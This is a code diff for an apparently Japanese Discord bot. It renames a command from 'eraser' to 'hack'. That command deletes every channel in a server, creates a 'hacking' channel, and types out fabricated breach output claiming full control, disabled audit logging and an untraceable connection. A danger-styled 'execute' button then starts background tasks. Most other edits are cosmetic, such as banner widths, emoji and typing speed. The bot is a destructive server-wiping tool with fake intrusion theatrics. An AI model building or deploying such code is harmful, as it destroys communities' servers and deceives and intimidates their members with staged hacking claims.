@@ -21,7 +21,7 @@ COMBINED_TEXT = (
     ".∧_∧\n"
     " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
     " と ＿⌒))\n"
-    "        (_ﾉﾉ\n"
+    "    (_ﾉﾉ\n"
     "\n"
     "∧,＿,∧  バカが治りますよ～に♡\n"
     "（`・ω・)つ━☆・*.\n"
@@ -42,7 +42,7 @@ class StartButton(ui.View):
         super().__init__(timeout=None)
         self.guild = guild
 
-    @ui.button(label="🚀 実行", style=discord.ButtonStyle.danger, emoji="⚡")
+    @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         if not stop_flag.is_set() and background_tasks:
@@ -120,7 +120,7 @@ async def type_and_send(channel, text):
             msg = await channel.send(output)
         else:
             await msg.edit(content=output)
-        await asyncio.sleep(0.05)
+        await asyncio.sleep(0.005)
 
 
 @bot.command()
@@ -138,15 +138,14 @@ async def stop(ctx):
 
 
 @bot.command()
-async def eraser(ctx):
+async def hack(ctx):
     guild = ctx.guild
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
-
     hacker_code = "```ansi\n"
-    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════════╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════════╝\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════╝\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
     hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
@@ -158,20 +157,12 @@ async def eraser(ctx):
     hacker_code += "\x1b[33m[007] \x1b[37m> Elevating privileges...                  [\x1b[32mOK\x1b[37m]\x1b[0m\n"
     hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
     hacker_code += "\n"
-    hacker_code += "\x1b[38;5;196m███╗   ███╗███████╗██████╗ ██╗   ██╗\x1b[0m\n"
-    hacker_code += "\x1b[38;5;214m████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝\x1b[0m\n"
-    hacker_code += "\x1b[38;5;226m██╔████╔██║█████╗  ██████╔╝ ╚████╔╝ \x1b[0m\n"
-    hacker_code += "\x1b[38;5;46m██║╚██╔╝██║██╔══╝  ██╔══██╗  ╚██╔╝  \x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m██║ ╚═╝ ██║███████╗██║  ██║   ██║   \x1b[0m\n"
-    hacker_code += "\x1b[38;5;45m╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   \x1b[0m\n"
-    hacker_code += "\n"
     hacker_code += "\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
     hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED — FULL CONTROL\x1b[0m\n"
     hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE — NO LOGS\x1b[0m\n"
     hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
     hacker_code += "```\n"
-    hacker_code += "**✅ 作成完了**\n"
-
+    hacker_code += "**✅ ハッキング完了**\n"
     # ✅ 一行ずつ表示
     await type_and_send(ch, hacker_code)
     # 最後に実行ボタン
